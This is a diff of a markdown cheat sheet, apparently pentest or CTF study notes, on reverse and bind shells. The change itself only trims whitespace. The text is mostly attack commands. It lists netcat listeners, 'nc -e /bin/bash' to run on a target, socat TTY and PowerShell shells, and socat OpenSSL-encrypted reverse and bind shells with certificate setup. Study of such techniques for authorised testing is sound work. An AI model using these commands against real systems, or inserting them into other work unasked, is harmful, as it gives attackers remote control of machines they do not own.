@@ -1,12 +1,12 @@
 # shells
 
 Reverse shell - server sends you a shell and offers you a /bin/bash of sorts to run your commands  
- Bind shell - server opens up a port and offers you a bash to run your input against that
+Bind shell - server opens up a port and offers you a bash to run your input against that
 
 ## BASIC REVERSE/BIND SHELLS
 
 `sudo nc -lvnp 443` - On the attacking machine  
- `nc -e /bin/bash` - On the target
+`nc -e /bin/bash` - On the target
 
 ## STABILIZING NC SHELL
 
@@ -37,7 +37,7 @@ bind shells
 3. on windows target - `socat TCP-L: EXEC:powershell.exe,pipes`
 
 socat linux only very stable tty shell - on linux attacker machine - ``socat TCP-L: FILE:`tty`,raw,echo=0``  
- on linux target machine - `socat TCP:: EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
+on linux target machine - `socat TCP:: EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
 
 ## SOCAT ENCRYPTED SHELLS
 
@@ -45,13 +45,13 @@ socat linux only very stable tty shell - on linux attacker machine - ``socat TCP
 2. We then need to merge the two created files into a single `.pem` file - `cat shell.key shell.crt > shell.pem`
 
 reverse shell listener - `socat OPENSSL-LISTEN:,cert=shell.pem,verify=0 -`  
- on target machine - `socat OPENSSL::,verify=0 EXEC:/bin/bash`
+on target machine - `socat OPENSSL::,verify=0 EXEC:/bin/bash`
 
 if we want to do for a bind shell, just use the same listener command on target machine, and attach cmd.exe / bash to it
 
 for eg: `socat OPENSSL-LISTEN:,cert=shell.pem,verify=0 -` - remove this dash at the end \(which previously connects listener and stdin\) and place `EXEC:/bin/bash` \(which connects listener and cmd.exe\)
 
 socat very stable tty openssl listener  
- on linux attacker machine - ``socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0``  
- on linux target machine - `socat OPENSSL::,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
+on linux attacker machine - ``socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0``  
+on linux target machine - `socat OPENSSL::,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
 
